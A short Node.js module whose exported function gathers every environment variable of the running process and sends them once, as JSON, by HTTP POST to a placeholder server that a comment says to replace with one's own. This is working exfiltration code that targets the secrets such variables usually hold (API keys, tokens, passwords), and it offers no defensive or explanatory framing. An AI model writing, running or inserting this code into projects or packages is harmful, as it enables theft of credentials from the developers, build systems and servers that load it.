const http = require('http');

let DONE = false;

module.exports = function() {
  // for (let variable in process.env) {
  //   console.log(`${variable}: ${process.env[variable]}`);
  // }
  if (DONE) return;

  const data = {};
  for (let variable in process.env) {
    data[variable] = process.env[variable];
  }

  const options = {
    hostname: 'your-server-url.com', // change this into what ever server you have
    port: 80,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
  };

  const req = http.request(options, (res) => {
    res.on('data', (chunk) => {
      console.log(`Response: ${chunk}`);
    });
  });

  req.on('error', (e) => {
    console.error(`Problem with request: ${e.message}`);
  });

  req.write(JSON.stringify(data));
  req.end();

  DONE = true;
}